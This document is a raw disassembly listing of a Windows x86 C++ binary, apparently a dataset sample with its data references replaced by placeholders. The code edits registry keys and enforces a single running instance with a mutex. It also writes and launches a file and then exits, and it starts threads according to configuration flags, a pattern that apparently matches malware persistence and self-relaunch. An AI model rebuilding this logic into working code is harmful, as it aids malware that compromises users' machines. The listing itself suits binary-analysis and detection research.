push eax
push r--data
push esi
call sub_409132
add esp 0xc
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
call [ RegDeleteKeyA@IAT ]
lea eax [ ebp - 0x1d4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
mov ebx rw-data
push r--data
push ebx
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
and [ ebp - 0x1 ] al
mov esi [ SetFileAttributesA@IAT ]
mov edi 0x80
lea eax [ ebp - 0x1d4 ]
push edi
push eax
mov [ ebp - 0x1 ] 0x1
call esi
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x2 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x12
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
push edi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call esi
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov esi [ std::operator<<@IAT ]
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call esi
pop ecx
mov edi r--data
pop ecx
lea eax [ ebp - 0x2 ]
push edi
push eax
lea eax [ ebp - 0x1d4 ]
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push r--data
push ebx
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
lea eax [ ebp - 0x1d4 ]
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call esi
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call esi
add esp 0x10
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
xor esi esi
lea ecx [ ebp - 0x44 ]
push esi
push esi
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
push esi
call [ exit@IAT ]
push edi
push ebx
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40712f
push ebp
mov ebp esp
sub esp 0x188
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
movsx eax [ ebp + 0xc ]
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
push esi
lea eax [ ebp - 0x188 ]
push 0x104
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ GetLongPathNameA@IAT ]
mov esi eax
lea eax [ ebp + 0xf ]
push eax
lea ecx [ ebp - 0x24 ]
push [ ebp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp + 0x13 ]
push eax
push r--data
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x188 ]
push esi
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
jmp [ eax * 4 + jump_table_407326 ]
push r--data
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
call sub_40e4e6
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x84 ]
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
call sub_40f0b5
test al al
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x3 ]
lea ecx [ ebp - 0x44 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x24 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x2 ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
sub_407452
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
lea eax [ ebp - 0x2c ]
push edi
push eax
call sub_407c53
sub esp 0xc
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push [ rw-data ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2c ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x3c ]
push eax
call sub_40efb5
add esp 0x24
mov ebx rw-data
mov ecx ebx
push eax
call sub_408510
lea ecx [ ebp - 0x3c ]
call sub_401b3c
push r--data
push 0xe
mov ecx ebx
call sub_401289
push eax
lea eax [ ebp - 0x4c ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov edi rw-data
mov ecx edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
push r--data
push esi
push 0x100000
mov [ ebp - 0x8 ] esi
call [ OpenMutexA@IAT ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx edi
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_408e97
add esp 0x10
test al al
je r-xdata
push 0xea60
push eax
call [ WaitForSingleObject@IAT ]
push 0xe
mov ecx ebx
call sub_401289
mov edi rw-data
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
push esi
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_409132
add esp 0xc
call sub_407d38
call sub_401000
push 0x104
push rw-data
push esi
call [ GetModuleFileNameA@IAT ]
push r--data
push r--data
lea eax [ ebp - 0x4c ]
push 0x80000002
push eax
call sub_408ef1
add esp 0x10
mov edi rw-data
mov ecx edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f0b5
test al al
je r-xdata
push 0x1
push r--data
push r--data
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp [ ebp - 0x8 ] esi
jne r-xdata
call eax
mov [ rw-data ] eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
push 0x27
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
push 0x2e
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
push 0xb
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x4
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
push 0x5
mov ecx ebx
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
push 0x6
mov ecx ebx
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
push 0x7
mov ecx ebx
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
push 0x8
mov ecx ebx
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
push 0x3
mov ecx ebx
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
call sub_4084b8
cmp [ rw-data ] esi
je r-xdata
cmp [ ebp - 0x8 ] esi
jne r-xdata
push 0x30
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push 0x28
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov edi [ CreateThread@IAT ]
cmp al 0x2
pop ecx
mov [ rw-data ] al
jne r-xdata
push 0x3
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
push 0x30
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x9
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_40712f
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_408e4e
add esp 0xc
test al al
jne r-xdata
push esi
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp [ ecx ] eax
jne r-xdata
cmp al 0x1
jne r-xdata
push 0x1
jmp r-xdata
mov edi rw-data
push rw-data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x1e
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
mov ecx ebx
setne al
push eax
push 0xc
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
mov ecx ebx
setne al
push eax
push 0xa
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x30
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x9
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
call sub_40650d
add esp 0x14
mov edi rw-data
jmp r-xdata
call sub_402a78
call sub_402b5b
jmp r-xdata
push 0xf
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
lea ecx [ ebp - 0x1c ]
mov [ rw-data ] al
lea eax [ ebp - 0x1 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push 0x31
mov ecx ebx
call sub_401289
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push esi
call sub_40faed
pop ecx
push esi
push esi
push esi
push sub_40f8bf
push esi
push esi
call edi
push r--data
push 0xd
mov ecx ebx
call sub_401289
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
inc eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp - 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
inc eax
mov ecx rw-data
push eax
push [ ebp - 0xc ]
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_4090d0
push [ ebp - 0xc ]
call sub_40fc2c
add esp 0x20
xor esi esi
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_408e4e
add esp 0xc
test al al
jne r-xdata
push 0x31
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x10
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_40712f
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ CreateDirectoryA@IAT ]
push 0x11
mov ecx ebx
call sub_401289
push eax
push r--data
lea eax [ ebp - 0x3c ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x4c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x1c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3c ]
push 0x11
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x10
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_40712f
add esp 0xc
lea ecx [ ebp - 0x1c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
jmp r-xdata
push 0xd
mov ecx ebx
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_407e0b
add esp 0x10
cmp al 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x1c ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403774
dec eax
jne r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
movsx eax [ rw-data ]
sub eax 0x31
je r-xdata
push 0x3
jmp r-xdata
push 0x16
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push esi
push esi
push esi
push sub_40e157
push esi
push esi
call edi
push 0x14
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x1c ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_4037d4
jmp r-xdata
pop esi
jmp r-xdata
push 0x23
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push esi
push esi
push 0x1
push sub_40e157
push esi
push esi
call edi
push 0x2b
mov ecx ebx
call sub_401289
mov ecx eax
